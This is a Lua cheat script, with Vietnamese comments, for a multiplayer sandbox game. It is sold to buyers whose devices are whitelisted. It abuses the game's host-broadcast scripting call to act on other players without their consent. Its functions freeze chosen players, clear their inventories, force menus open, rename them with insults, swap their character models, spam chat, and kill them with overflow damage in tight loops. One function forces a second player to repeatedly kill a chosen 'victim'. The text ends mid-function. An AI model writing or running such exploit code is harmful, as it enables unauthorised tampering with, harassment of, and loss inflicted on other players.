                            local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
                            for i = 1, size do
                                if not _G.dffz_enabled then break end
                                local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)
                                if targetPlayer then
                                    local targetUin = targetPlayer:getUin()
                                    -- Kiểm tra nếu targetUin khác bản thân VÀ không nằm trong whitelist
                                    if targetUin ~= myUin and not whitelist[targetUin] then
                                        
                                        -- === ĐOẠN MÃ MỚI BẠN MUỐN THÊM (Tác động lên mục tiêu) ===
                                        local tdata = {}
                                        tdata[1] = "player"
                                        tdata[2] = "setActionAttrState"
                                        tdata[3] = { targetUin, 64, true }
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        -- ========================================================

                                        tdata = {}
                                        tdata[1] = "player";
                                        tdata[2] = "changPlayerMoveType";
                                        tdata[3] = {targetUin, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "world";
                                        tdata[2] = "SetTimeVanishingSpeed";
                                        tdata[3] = {500}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player";
                                        tdata[2] = "changeViewMode";
                                        tdata[3] = {targetUin, 9, true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)  
                                        
                                        tdata = {}
                                        tdata[1] = "player";
                                        tdata[2] = "forceOpenBoxUI";
                                        tdata[3] = {targetUin, 797}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "player";
                                        tdata[2] = "forceOpenBoxUI";
                                        tdata[3] = {targetUin, 798}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor";
                                        tdata[2] = "changeCustomModel";
                                        tdata[3] = {targetUin, [=[skin_0]=]}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "chat";
                                        tdata[2] = "sendChat";
                                        tdata[3] = {"#c006600心#c008800净#c00AA00莲#c00CC00花#c00EE00开#c33FF33万#c66FF66路#c88FF88-#cAAFFAA慈#cCCFFCC悲#cDDFFDD普#cEEFFEE度#cE0FFE0遍#cE8FFE8尘#cFFFFFF寰", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat";
                                        tdata[2] = "sendChat";
                                        tdata[3] = {"#c006600心#c008800净#c00AA00莲#c00CC00花#c00EE00开#c33FF33万#c66FF66路#c88FF88-#cAAFFAA慈#cCCFFCC悲#cDDFFDD普#cEEFFEE度#cE0FFE0遍#cE8FFE8尘#cFFFFFF寰", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat";
                                        tdata[2] = "sendChat";
                                        tdata[3] = {"#c006600放#c008800下#c00AA00烦#c00CC00忧#c00EE00心#c33FF33自#c66FF66在#c88FF88-#cAAFFAA觉#cCCFFCC悟#cDDFFDD真#cEEFFEE如#cE0FFE0亮#cE8FFE8一#cFFFFFF生", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat";
                                        tdata[2] = "sendChat";
                                        tdata[3] = {"#c006600放#c008800下#c00AA00烦#c00CC00忧#c00EE00心#c33FF33自#c66FF66在#c88FF88-#cAAFFAA觉#cCCFFCC悟#cDDFFDD真#cEEFFEE如#cE0FFE0亮#cE8FFE8一#cFFFFFF生", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)


                                        tdata = {}
                                        tdata[1] = "chat";
                                        tdata[2] = "sendChat";
                                        tdata[3] = {"#c006600风#c008800轻#c00AA00云#c00CC00淡#c00EE00心#c33FF33不#c66FF66变#c88FF88-#cAAFFAA乱#cCCFFCC世#cDDFFDD浮#cEEFFEE沉#cE0FFE0稳#cE8FFE8修#cFFFFFF行", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat";
                                        tdata[2] = "sendChat";
                                        tdata[3] = {"#c006600风#c008800轻#c00AA00云#c00CC00淡#c00EE00心#c33FF33不#c66FF66变#c88FF88-#cAAFFAA乱#cCCFFCC世#cDDFFDD浮#cEEFFEE沉#cE0FFE0稳#cE8FFE8修#cFFFFFF行", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat";
                                        tdata[2] = "sendChat";
                                        tdata[3] = {"#c003300菩#c006600提#c009900本#c00CC00无#c00FF00树#c33FF33明#c66FF66镜#c99FF99台 #cCCFFC-#cAAFFAA何#cCCFFCC处#cDDFFDD惹#cEEFFEE尘#cFFFFFF埃", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat";
                                        tdata[2] = "sendChat";
                                        tdata[3] = {"#c003300菩#c006600提#c009900本#c00CC00无#c00FF00树#c33FF33明#c66FF66镜#c99FF99台 #cCCFFC-#cAAFFAA何#cCCFFCC处#cDDFFDD惹#cEEFFEE尘#cFFFFFF埃", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat";
                                        tdata[2] = "sendChat";
                                        tdata[3] = {"#c003300斩#c006600妖#c009900除#c00CC00魔#c00FF00卫#c33FF33正#c66FF66道#c99FF99-#cCCFFCC荡#cAAFFAA尽#cCCFFCC天#cDDFFDD下#cEEFFEE诸#cE8FFE8邪#cFFFFFF恶", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat";
                                        tdata[2] = "sendChat";
                                        tdata[3] = {"#c003300斩#c006600妖#c009900除#c00CC00魔#c00FF00卫#c33FF33正#c66FF66道#c99FF99-#cCCFFCC荡#cAAFFAA尽#cCCFFCC天#cDDFFDD下#cEEFFEE诸#cE8FFE8邪#cFFFFFF恶", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat";
                                        tdata[2] = "sendChat";
                                        tdata[3] = {"#c003300金#c005500刚#c007700怒#c009900目#c00BB00降#c00DD00妖#c00FF00孽#c33FF33-#c55FF55佛#c77FF77光#c99FF99普#cBBFFBB照#cDDFFDD破#cEEFFEE群#cFFFFFF魔", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat";
                                        tdata[2] = "sendChat";
                                        tdata[3] = {"#c003300金#c005500刚#c007700怒#c009900目#c00BB00降#c00DD00妖#c00FF00孽#c33FF33-#c55FF55佛#c77FF77光#c99FF99普#cBBFFBB照#cDDFFDD破#cEEFFEE群#cFFFFFF魔", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat";
                                        tdata[2] = "sendChat";
                                        tdata[3] = {"#cFF9900斩#cFF9F00草#cFFA600除#cFFAC00根#cFFB300绝#cFFB900后#cFFBF00患#cFFC600-#cFFCC00 #cFFD300绝#cFFD900不#cFFDF00留#cFFE600情#cFFEC00灭#cFFF200群#cFFF900邪", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                        tdata = {}
                                        tdata[1] = "chat";
                                        tdata[2] = "sendChat";
                                        tdata[3] = {"#cFF9900斩#cFF9F00草#cFFA600除#cFFAC00根#cFFB300绝#cFFB900后#cFFBF00患#cFFC600-#cFFCC00 #cFFD300绝#cFFD900不#cFFDF00留#cFFE600情#cFFEC00灭#cFFF200群#cFFF900邪", 1, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player";
                                        tdata[2] = "notifyGameInfo2Self";
                                        tdata[3] = {targetUin, "#R#b#K太初#B之心经 #Y这点程度还不足以彻底击垮我们 #G我们是坚强的越南人民！"}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor";
                                        tdata[2] = "setnickname";
                                        tdata[3] = {targetUin, "#b#c99FF99佛陀的惩罚"}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "backpack";
                                        tdata[2] = "clearAllPack";
                                        tdata[3] = {targetUin}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player";
                                        tdata[2] = "setActionAttrState";
                                        tdata[3] = {targetUin, 1, false}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player";
                                        tdata[2] = "setActionAttrState";
                                        tdata[3] = {myUin, 64, false}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player";
                                        tdata[2] = "setActionAttrState";
                                        tdata[3] = {myUin, 128, false}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "world";
                                        tdata[2] = "SetSkyBoxMaps";
                                        tdata[3] = {1, 30012, ""}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "actor";
                                        tdata[2] = "playerHurt";
                                        tdata[3] = {myUin, targetUin, 1.8e+308, 0}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        tdata = {}
                                        tdata[1] = "player";
                                        tdata[2] = "setAtt";
                                        tdata[3] = {targetUin, 1, 2}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        
                                        for _, fx in ipairs({"yanhua", "12834", "bossskill_lasertailblue", "ice_bingshi_boss", "mob_3514_white", "nengliang_xiqu", "nengliang_baozha"}) do
                                            tdata = {}
                                            tdata[1] = "actor";
                                            tdata[2] = "playBodyEffectByFile";
                                            tdata[3] = {myUin, fx, true}
                                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                        end
                                        
                                        tdata = {}
                                        tdata[1] = "actor";
                                        tdata[2] = "playBodyEffectByFile";
                                        tdata[3] = {targetUin, "jiguang01", true}
                                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                    end
                                end
                            end
                        end, function(err)
                            print("Lỗi vòng lặp dffz:", err)
                        end)

                        -- Khoảng thời gian nghỉ giữa mỗi lần quét vòng lặp để tránh crash game
                        threadpool:wait(0.1)
                    end
                    
                    print("Vòng lặp dffz đã kết thúc")
                    _G.dffz_thread = nil
                end)
            end
        end
    )
end

function pctn12()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra thiết bị có trong danh sách trắng không
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end

    ShowGameTipsWithoutFilter("#cFF3333Đã kích hoạt thành công")
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

    -- Hộp thoại lựa chọn Bật / Tắt
    GetInst("MessageBoxInterface"):dualBtnBox(
        "Dừng lại ở bên trái\nBắt đầu từ bên phải",
        "Dừng",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                _G.dffz_enabled = false
                ShowGameTipsWithoutFilter("#c000033Đ#c000066ã#c000099 #c0000CCd#c0000FFừ#c0033FFn#c0066FFg#c0099FF #c00CCFFl#c33DDFFạ#c66EEFFi#cFFFFFF")
                
            elseif btnType == 1 then
                _G.dffz_enabled = false
                
                if _G.dffz_thread then
                    _G.dffz_thread = nil
                end
                
                threadpool:wait(0.1)
                
                _G.dffz_enabled = true
                
                -- ========================================================
                -- GỌI BẢNG CHỌN NGƯỜI CHƠI (SHOWPLAYERLIST)
                -- ========================================================
                ShowPlayerList(function(selectedUin)
                    if not selectedUin then
                        _G.dffz_enabled = false
                        ShowGameTipsWithoutFilter("#RĐã hủy chọn người chơi")
                        return
                    end

                    -- ========================================================
                    -- KIỂM TRA DANH SÁCH TRẮNG TOÀN CỤC (GLOBAL WHITELIST)
                    -- ========================================================
                    local isWhitelisted = false
                    if (whitelist and whitelist[selectedUin]) or (_G.GlobalWhitelist and _G.GlobalWhitelist[selectedUin]) then
                        isWhitelisted = true
                    end

                    if isWhitelisted then
                        _G.dffz_enabled = false
                        ShowGameTipsWithoutFilter("#RNgười này nằm trong danh sách trắng toàn cục (Whitelist)!")
                        return
                    end

                    -- Lấy UID của bản thân
                    local myUin = nil
                    if AccountManager and AccountManager.getUin then
                        pcall(function()
                            myUin = AccountManager:getUin()
                        end)
                    end

                    -- ========================================================
                    -- MỞ LUỒNG CHẠY CHÍNH
                    -- ========================================================
                    _G.dffz_thread = threadpool:work(function()
                        ShowGameTipsWithoutFilter("#c00ffffĐã BẬT thực thi!")

                        while _G.dffz_enabled do
                            xpcall(function()
                                -- Kiểm tra lại danh sách trắng toàn cục liên tục trong lúc chạy
                                if (whitelist and whitelist[selectedUin]) or (_G.GlobalWhitelist and _G.GlobalWhitelist[selectedUin]) then
                                    _G.dffz_enabled = false
                                    return
                                end

                                local targetUin = selectedUin
                                if targetUin and targetUin ~= myUin then
                                    -- Các tác động lặp liên tục
                                    local tdata = { "player", "changPlayerMoveType", {targetUin, 0} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "forceOpenBoxUI", {targetUin, 797} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "forceOpenBoxUI", {targetUin, 798} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "actor", "changeCustomModel", {targetUin, "role_11"} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "backpack", "clearAllPack", {targetUin} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setActionAttrState", {targetUin, 1, false} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setActionAttrState", {myUin, 64, false} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setActionAttrState", {myUin, 128, false} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "actor", "playerHurt", {myUin, targetUin, 1.8e+308, 0} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = { "player", "setAtt", {targetUin, 1, 2} }
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    -- Gửi tin nhắn chat màu
                                    tdata = {}
                                    tdata[1] = "chat"
                                    tdata[2] = "sendChat"
                                    tdata[3] = {"#c000033你#c000066在#c000099这#c0000CC里#c0000FF做#c0066FF什#c00CCFF么#c66EEFF？", 1, 0}
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = {}
                                    tdata[1] = "chat"
                                    tdata[2] = "sendChat"
                                    tdata[3] = {"#c000033你#c000066在#c000099这#c0000CC里#c0000FF做#c0066FF什#c00CCFF么#c66EEFF？", 1, 0}
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = {}
                                    tdata[1] = "chat"
                                    tdata[2] = "sendChat"
                                    tdata[3] = {"#c000033你#c000066在#c000099这#c0000CC里#c0000FF做#c0066FF什#c00CCFF么#c66EEFF？", 1, 0}
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = {}
                                    tdata[1] = "chat"
                                    tdata[2] = "sendChat"
                                    tdata[3] = {"#c000033你#c000066为#c000099什#c0000CC么#c0000FF要#c0055FF打#c00AAFF我#c66EEFF？", 1, 0}
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = {}
                                    tdata[1] = "chat"
                                    tdata[2] = "sendChat"
                                    tdata[3] = {"#c000033你#c000066为#c000099什#c0000CC么#c0000FF要#c0055FF打#c00AAFF我#c66EEFF？", 1, 0}
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = {}
                                    tdata[1] = "chat"
                                    tdata[2] = "sendChat"
                                    tdata[3] = {"#c000033这#c000066是#c000099你#c0000CC的#c0000FF选#c0066FF择#c00CCFF。", 1, 0}
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = {}
                                    tdata[1] = "chat"
                                    tdata[2] = "sendChat"
                                    tdata[3] = {"#c000033这#c000066是#c000099你#c0000CC的#c0000FF选#c0066FF择#c00CCFF。", 1, 0}
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = {}
                                    tdata[1] = "chat"
                                    tdata[2] = "sendChat"
                                    tdata[3] = {"#c000033这#c000066是#c000099你#c0000CC的#c0000FF选#c0066FF择#c00CCFF。", 1, 0}
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    -- ĐÃ THÊM: Tạo hiệu ứng body effect 'jiguang01' lên mục tiêu
                                    tdata = {}
                                    tdata[1] = "actor"
                                    tdata[2] = "playBodyEffectByFile"
                                    tdata[3] = {targetUin, "jiguang01", true}
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = {}
                                    tdata[1] = "actor"
                                    tdata[2] = "playBodyEffectByFile"
                                    tdata[3] = {targetUin, "pumpkin_fireworks2", true}
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)

                                    tdata = {}
                                    tdata[1] = "actor"
                                    tdata[2] = "playBodyEffectByFile"
                                    tdata[3] = {targetUin, "3", true}
                                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                end
                            end, function(err)
                                print("Lỗi vòng lặp: " .. tostring(err))
                            end)

                            threadpool:wait(0.00001) 
                        end

                        -- ========================================================
                        -- KHI DỪNG SCRIPT: KHÔI PHỤC TRẠNG THÁI CHO MỤC TIÊU
                        -- ========================================================
                        if selectedUin and selectedUin ~= myUin then
                            -- Khôi phục di chuyển cho đối thủ
                            local restoreMove = { "player", "changPlayerMoveType", {selectedUin, 1} }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, restoreMove)
                        end

                        ShowGameTipsWithoutFilter("#c00ffffĐã TẮT thực thi thành công!")
                        _G.dffz_thread = nil
                    end)

                end, "选择要作用的目标")
            end
        end
    )
end

function pctn99()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end

    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

    if not ClientCurGame or not ClientCurGame:isInGame() then
        ShowGameTipsWithoutFilter("#cFF0000Vui lòng vào phòng trò chơi trước")
        return
    end

    LoadHomelandLuas()
    local uin_list = GetPlayerUinList()

    if #uin_list < 2 then
        ShowGameTipsWithoutFilter("#cFF0000Phòng phải có ít nhất 2 người chơi khác mới dùng được tính năng này!")
        return
    end

    -- Khởi tạo danh sách trắng toàn cục nếu chưa có
    if whitelist == nil then
        whitelist = {}
    end

    local myUin = AccountManager:getUin()

    -- ========================================================
    -- BƯỚC 1: MỞ BẢNG CHỌN NẠN NHÂN (Mục tiêu bị tiêu diệt)
    -- ========================================================
    local data1 = {
        visit = {
            history_num = "Chọn Nạn Nhân",
            today_num = "#cFF7aad Tổng số: " .. #uin_list
        },
        event_home = {{param1 = 0, event_id = 5, event_time = 0}},
        event_visit = {}
    }
    for i = 1, #uin_list do
        data1.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
    end

    GetInst("UIManager"):Open("HomeEventRecord")
    GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data1)
    getglobal("HomeEventRecordTitleFrameName"):SetText("请选择要被击杀的目标（受害者）")
    getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách phòng")
    getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn chọn nạn nhân")

    local ctrl1 = GetInst("UIManager"):GetCtrl("HomeEventRecord")
    local oldClick1 = ctrl1.EnterFriendHomeBtn_OnClick

    function ctrl1:EnterFriendHomeBtn_OnClick()
        GetInst("UIManager"):Close("HomeEventRecord")
        ctrl1.EnterFriendHomeBtn_OnClick = oldClick1

        local targetUin = this:GetClientID()

        -- Kiểm tra whitelist cho nạn nhân
        if whitelist[targetUin] or targetUin == myUin then
            ShowGameTipsWithoutFilter("#cFF0000Không thể chọn bản thân hoặc người trong danh sách trắng làm nạn nhân!")
            return
        end

        ShowGameTipsWithoutFilter("#c00ffffĐã chọn Nạn Nhân: " .. targetUin)

        -- ========================================================
        -- BƯỚC 2: MỞ BẢNG CHỌN ĐAO PHỦ (Người ra tay giết hộ)
        -- ========================================================
        threadpool:delay(0.5, function()
            local data2 = {
                visit = {
                    history_num = "Chọn Đao Phủ",
                    today_num = "#cFF7aad Tổng số: " .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            for i = 1, #uin_list do
                data2.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end

            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data2)
            getglobal("HomeEventRecordTitleFrameName"):SetText("请选择代为行刑的玩家（刽子手）")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách phòng")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn chọn đao phủ")

            local oldClick2 = ctrl2.EnterFriendHomeBtn_OnClick

            function ctrl2:EnterFriendHomeBtn_OnClick()
                GetInst("UIManager"):Close("HomeEventRecord")
                ctrl2.EnterFriendHomeBtn_OnClick = oldClick2

                local killerUin = this:GetClientID()

                if killerUin == targetUin then
                    ShowGameTipsWithoutFilter("#cFF0000Đao phủ và nạn nhân không thể là cùng một người!")
                    return
                end

                if whitelist[killerUin] or killerUin == myUin then
                    ShowGameTipsWithoutFilter("#cFF0000Không thể chọn bản thân hoặc người trong danh sách trắng làm đao phủ!")
                    return
                end

                ShowGameTipsWithoutFilter("#c00ffffĐã chỉ định Đao Phủ " .. killerUin .. " tiêu diệt Nạn Nhân " .. targetUin)

                -- Bật cờ chạy vòng lặp
                _G.proxyKill_enabled = true

                -- ========================================================
                -- BƯỚC 3: VÒNG LẶP ÉP ĐAO PHỦ TIÊU DIỆT NẠN NHÂN LIÊN TỤC
                -- ========================================================
                threadpool:work(function()
                    local loopCount = 0

                    while _G.proxyKill_enabled do
                        loopCount = loopCount + 1

                        pcall(function()
                            -- 1. Cấp quyền tấn công (lệnh 64) cho đao phủ
                            local grantPower = {
                                [1] = "player",
                                [2] = "setActionAttrState",
                                [3] = { killerUin, 64, true }
                            }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, grantPower)

                            -- 2. Khóa di chuyển/hành động của nạn nhân
                            if loopCount % 10 == 1 then
                                local keepDisable = {
                                    [1] = "player",
                                    [2] = "setActionAttrState",
                                    [3] = { targetUin, 32, false }
                                }
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, keepDisable)
                            end

                            -- 3. Mở rương (797 và 798), đổi tên nạn nhân thành chó
                            local disableAttack1 = { [1] = "player", [2] = "forceOpenBoxUI", [3] = { targetUin, 797 } }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack1)

                            local disableAttack2 = { [1] = "player", [2] = "forceOpenBoxUI", [3] = { targetUin, 798 } }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, disableAttack2)

                            local setNick = { [1] = "actor", [2] = "setnickname", [3] = { targetUin, '#R狗' } }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, setNick)

                            local changeModel = { [1] = "actor", [2] = "changeCustomModel", [3] = { targetUin, [=[mob_3407]=] } }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, changeModel)

                            -- 4. Xóa buff bất tử của nạn nhân
                            local clearBuff = { [1] = "buff", [2] = "clearAllBuff", [3] = { targetUin } }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, clearBuff)

                            -- 5. Hiệu ứng la-de, búa sét
                            local t1 = { [1] = "actor", [2] = "playBodyEffectByFile", [3] = { targetUin, "jiguang01", true } }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t1)

                            local t10 = { [1] = "actor", [2] = "playBodyEffectByFile", [3] = { targetUin, "aotu_06_leishenzhichui", true } }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, t10)

                            -- 6. Ép đao phủ (killerUin) ra đòn chí mạng tiêu diệt nạn nhân (targetUin)
                            local proxyHurt = {
                                [1] = "actor",
                                [2] = "playerHurt",
                                [3] = { killerUin, targetUin, 1.8e+308, 0 }
                            }
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, proxyHurt)
                        end)

                        if loopCount % 10 == 0 then
                            ShowGameTipsWithoutFilter("#c00ffffĐao phủ đang ra đòn lần thứ " .. loopCount)
                        end

                        threadpool:wait(0.1)
                    end

                    -- Khôi phục trạng thái cho nạn nhân sau khi dừng
                    local enableAttack = { [1] = "player", [2] = "setActionAttrState", [3] = { targetUin, 32, true } }
                    pcall(function()
                        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, enableAttack)
                    end)

                    ShowGameTipsWithoutFilter("#cFF0000Đã dừng tính năng chỉ định đao phủ!")
                end)
            end
        end)
    end
end

function pctv10()
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- Kiểm tra thiết bị có trong danh sách trắng hay không
    if not DEVICE_AUTH_DISABLED and not author3[currentDeviceID] then
        ShowGameTipsWithoutFilter("#R此按钮仅限购买者使用", 3)
        return
    end

    ShowGameTipsWithoutFilter("#RĐã kích hoạt thành công")
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

    -- Hộp thoại lựa chọn Bật / Tắt (Bên trái: Tắt, Bên phải: Bật)
    GetInst("MessageBoxInterface"):dualBtnBox(
        "#cCCFF99Bật 1 dãi cầu vồng màu sắc\nDừng lại ở bên trái\nBắt đầu từ bên phải",
        "关闭",
        nil,
        function(userData, btnType)
            if btnType == 0 then
                -- Nút TẮT (Bên trái) -> Dừng vòng lặp và XÓA LUÔN hình ảnh/chữ trên đầu
                _G.rainbow_name_enabled = false
                
                local myUin = nil
                if CurMainPlayer and CurMainPlayer.getUin then
                    pcall(function() myUin = CurMainPlayer:getUin() end)
                end
                if not myUin then myUin = AccountManager:getUin() end

                -- Gói tin xóa ảnh và chữ theo Actor (ID 1 tương ứng với ID lúc tạo ảnh)
                local removeImage = { [1] = "graphics", [2] = "removeGraphicsImageByActor", [3] = { myUin, 1 } }
                local removeText  = { [1] = "graphics", [2] = "removeGraphicsTxtByActor", [3] = { myUin } }
                
                pcall(function()
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, removeImage)
                    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, removeText)
                end)

                ShowGameTipsWithoutFilter("#cFF0000Đã tắt và xóa hiệu ứng trên đầu!")
                
            elseif btnType == 1 then
                -- Nút BẬT (Bên phải) -> Hiển thị bảng nhập chữ bằng ShowTextInputSafe
                ShowTextInputSafe(function(text)
                    if not text or text == "" then
                        ShowGameTipsWithoutFilter("Vui lòng nhập nội dung văn bản hợp lệ")
                        return
                    end

                    _G.rainbow_name_generation = (_G.rainbow_name_generation or 0) + 1
                    local currentGeneration = _G.rainbow_name_generation
                    _G.rainbow_name_enabled = true

                    -- Lấy UID trực tiếp từ nhân vật hiện tại an toàn
                    local myUin = nil
                    if CurMainPlayer and CurMainPlayer.getUin then
                        pcall(function()
                            myUin = CurMainPlayer:getUin()
                        end)
                    end
                    
                    if not myUin then
                        myUin = AccountManager:getUin()
                    end

                    -- Nội dung chữ kèm khoảng trắng để chạy màu vòng tròn mượt
                    local nickname = text .. "          "

                    -- Các hàm xử lý màu (HSV -> RGB -> Hex)
                    local function splitUtf8(str)
                        local characters = {}
                        for character in string.gmatch(str, "[%z\1-\127\194-\244][\128-\191]*") do
                            table.insert(characters, character)
                        end
                        return characters
                    end

                    local function hsvToRgb(hue, saturation, value)
                        local sector = math.floor(hue * 6)
                        local fraction = hue * 6 - sector
                        local p = value * (1 - saturation)
                        local q = value * (1 - fraction * saturation)
                        local t = value * (1 - (1 - fraction) * saturation)

                        sector = sector % 6
                        local red, green, blue

